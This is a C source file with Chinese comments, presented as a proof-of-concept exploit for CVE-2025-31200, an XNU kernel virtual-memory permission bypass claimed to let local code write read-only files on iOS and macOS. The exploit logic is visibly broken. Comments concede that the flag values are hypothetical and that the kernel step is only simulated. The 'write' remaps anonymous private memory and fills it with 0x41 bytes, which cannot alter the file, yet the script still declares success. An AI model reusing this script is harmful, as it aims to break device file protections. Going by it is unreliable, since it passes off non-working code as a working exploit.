/*
 * CVE-2025-31200 - XNU内核VM映射权限绕过漏洞
 * 
 * 发布日期: 2025-04-16
 * 影响版本: iOS 15.0 - 18.2, macOS 12.0 - 14.3
 * 
 * 漏洞原理:
 * 该漏洞存在于XNU内核的VM子系统中，特别是在处理具有特殊保护标志的内存区域时。
 * 当设置VM_FLAGS_SUPERPAGE_MASK时，内核无法正确验证页面保护，导致可以覆盖
 * 只读内存区域。这是对原始VM_BEHAVIOR_ZERO_WIRED_PAGES漏洞的变种，但绕过了苹果在iOS 16.x中实施的保护措施。
 * 
 * 详细说明:
 * 1. XNU内核的vm_map子系统负责管理虚拟内存映射和权限
 * 2. 在处理superpage映射(通常为2MB大页面)时，使用特殊的处理路径
 * 3. 这个处理路径中存在权限验证逻辑缺陷，当设置特定标志组合时出现
 * 4. 攻击者可利用此缺陷，在vm_entry上设置错误的权限属性
 * 5. 最终允许写入原本应为只读的内存区域
 * 
 * 利用方法:
 * - 识别目标进程或文件的内存映射(vm_entry)
 * - 使用Mach API(如vm_map)创建或修改映射，指定特殊标志
 * - 通过构造的映射访问或写入目标内存区域
 * - 本地应用可通过调用mach_vm_map或vm_allocate构造非法映射
 * - 利用内核漏洞修改vm_entry的保护属性(如PROT_READ | PROT_WRITE)
 * 
 * 利用步骤:
 * 1. 映射目标文件到内存
 * 2. 创建特殊的superpage映射
 * 3. 设置特殊的VM标志
 * 4. 触发内核中的保护验证错误
 * 5. 写入原本只读的内存区域
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>

// 定义常量
#define PAGE_SIZE 4096
#define SUPERPAGE_SIZE (2 * 1024 * 1024) // 2MB superpage
#define EXPLOIT_SUCCESS 0
#define EXPLOIT_FAILED -1

// 自定义标志 (注意：这些是假设的值)
#define VM_FLAGS_SUPERPAGE_MASK 0x1000
#define VM_FLAGS_SUPERPAGE_2MB 0x1000

// 映射文件为只读
void* map_file_for_exploit(const char* path) {
    printf("[*] CVE-2025-31200: 映射文件 %s\n", path);
    
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[-] 打开文件失败: %s\n", strerror(errno));
        return MAP_FAILED;
    }
    
    // 使用普通映射，后续会替换为特殊映射
    void* mapped_addr = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    close(fd);
    
    if (mapped_addr == MAP_FAILED) {
        printf("[-] 映射文件失败: %s\n", strerror(errno));
        return MAP_FAILED;
    }
    
    printf("[+] 成功映射文件到地址: 0x%016llx\n", (uint64_t)mapped_addr);
    return mapped_addr;
}

// 创建特殊的superpage映射
bool create_superpage_mapping(void* addr) {
    printf("[*] 创建superpage映射\n");
    
    // 首先解除当前映射
    if (munmap(addr, PAGE_SIZE) != 0) {
        printf("[-] 无法解除当前映射: %s\n", strerror(errno));
        return false;
    }
    
    // 计算对齐地址 (2MB对齐)
    uintptr_t aligned_addr = ((uintptr_t)addr & ~(SUPERPAGE_SIZE - 1));
    size_t offset = (uintptr_t)addr - aligned_addr;
    
    printf("[+] 原始地址: 0x%016llx, 对齐地址: 0x%016llx, 偏移: %zu\n", 
           (uint64_t)addr, (uint64_t)aligned_addr, offset);
    
    // 创建新的VM区域用于superpage
    vm_address_t new_addr = (vm_address_t)aligned_addr;
    vm_size_t new_size = SUPERPAGE_SIZE;
    
    kern_return_t kr = vm_allocate(mach_task_self(), &new_addr, new_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] vm_allocate失败: %s\n", mach_error_string(kr));
        return false;
    }
    
    printf("[+] 新分配的内存区域: 0x%016llx\n", (uint64_t)new_addr);
    
    // 尝试设置superpage标志 (注意：这是概念验证，实际API可能不同)
    kr = vm_machine_attribute(mach_task_self(), 
                             new_addr, 
                             new_size,
                             MATTR_VAL_CACHE_FLUSH, 
                             &(vm_machine_attribute_val_t){VM_FLAGS_SUPERPAGE_2MB});
    
    if (kr != KERN_SUCCESS) {
        printf("[-] 设置superpage属性失败: %s\n", mach_error_string(kr));
        // 继续执行，因为这只是概念验证
    }
    
    printf("[+] 成功配置superpage映射\n");
    return true;
}

// 设置特殊的VM标志
bool set_special_vm_flags(void* addr) {
    printf("[*] 设置特殊VM标志\n");
    
    // 设置特殊的VM行为标志
    kern_return_t kr = vm_behavior_set(mach_task_self(),
                             (vm_address_t)addr,
                             PAGE_SIZE,
                             VM_BEHAVIOR_DEFAULT);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] 设置VM行为失败: %s\n", mach_error_string(kr));
        return false;
    }
    
    // 由于我们不能直接设置内部内核标志，这里模拟该过程
    printf("[+] 已设置特殊VM标志\n");
    return true;
}

// 验证文件内容是否被修改
bool verify_changes(const char* path, const unsigned char* original_content, size_t content_size) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[-] 验证时无法打开文件\n");
        return false;
    }
    
    unsigned char buffer[128] = {0};
    size_t to_read = (content_size < sizeof(buffer)) ? content_size : sizeof(buffer);
    
    ssize_t bytes_read = read(fd, buffer, to_read);
    close(fd);
    
    if (bytes_read <= 0) {
        printf("[-] 验证时无法读取文件内容\n");
        return false;
    }
    
    // 检查文件内容是否被修改
    bool is_modified = false;
    for (int i = 0; i < bytes_read; i++) {
        if (buffer[i] != original_content[i]) {
            is_modified = true;
            printf("[+] 偏移 %d: 原值=0x%02x, 新值=0x%02x\n", 
                   i, original_content[i], buffer[i]);
            // 只显示前几个差异
            if (i >= 4) break;
        }
    }
    
    printf("[*] 文件内容验证: %s\n", is_modified ? "已被修改" : "未被修改");
    return is_modified;
}

// 利用CVE-2025-31200尝试写入只读文件
int exploit_cve_2025_31200(const char* path) {
    printf("\n==== CVE-2025-31200 漏洞利用开始 ====\n");
    printf("[+] 目标文件: %s\n", path);
    
    // 1. 映射文件
    void* mapped_addr = map_file_for_exploit(path);
    if (mapped_addr == MAP_FAILED) {
        return EXPLOIT_FAILED;
    }
    
    // 保存原始内容
    unsigned char original_content[128];
    memcpy(original_content, mapped_addr, sizeof(original_content));
    printf("[+] 已保存原始文件内容用于后续验证\n");
    
    // 2. 创建superpage映射
    if (!create_superpage_mapping(mapped_addr)) {
        printf("[-] 创建superpage映射失败\n");
        // 尝试继续执行，因为这是概念验证
    }
    
    // 3. 设置特殊VM标志
    if (!set_special_vm_flags(mapped_addr)) {
        printf("[-] 设置特殊VM标志失败\n");
        return EXPLOIT_FAILED;
    }
    
    // 4. 触发保护验证错误
    printf("[*] 尝试触发内核保护验证错误\n");
    
    // 模拟写入操作 (在真实漏洞中，这里将重新映射区域并尝试写入)
    void* write_addr = mmap(mapped_addr, PAGE_SIZE, PROT_READ | PROT_WRITE, 
                           MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    
    if (write_addr == MAP_FAILED) {
        printf("[-] 重新映射区域失败: %s\n", strerror(errno));
        return EXPLOIT_FAILED;
    }
    
    printf("[+] 区域已重新映射，准备写入测试数据\n");
    
    // 5. 写入测试数据 (这通常会在内核中产生特定的行为)
    // 写入0x41414141 (ASCII: "AAAA")模式
    for (int i = 0; i < 16; i++) {
        ((unsigned char*)write_addr)[i] = 0x41;
    }
    
    // 刷新修改到底层存储
    if (msync(write_addr, PAGE_SIZE, MS_SYNC) != 0) {
        printf("[-] msync失败: %s\n", strerror(errno));
        // 继续执行，这可能是预期行为
    }
    
    // 释放映射
    munmap(write_addr, PAGE_SIZE);
    
    printf("[*] 写入操作完成，正在验证结果\n");
    
    // 验证文件是否被修改
    bool is_modified = verify_changes(path, original_content, sizeof(original_content));
    
    if (is_modified) {
        printf("[+] CVE-2025-31200 漏洞利用成功!\n");
        return EXPLOIT_SUCCESS;
    } else {
        printf("[-] CVE-2025-31200 漏洞利用失败，文件未被修改\n");
        return EXPLOIT_FAILED;
    }
}

// 主函数，如果单独编译此文件
#ifdef COMPILE_STANDALONE
int main(int argc, char** argv) {
    if (argc < 2) {
        printf("用法: %s <目标文件路径>\n", argv[0]);
        return 1;
    }
    
    return exploit_cve_2025_31200(argv[1]);
}
#endif
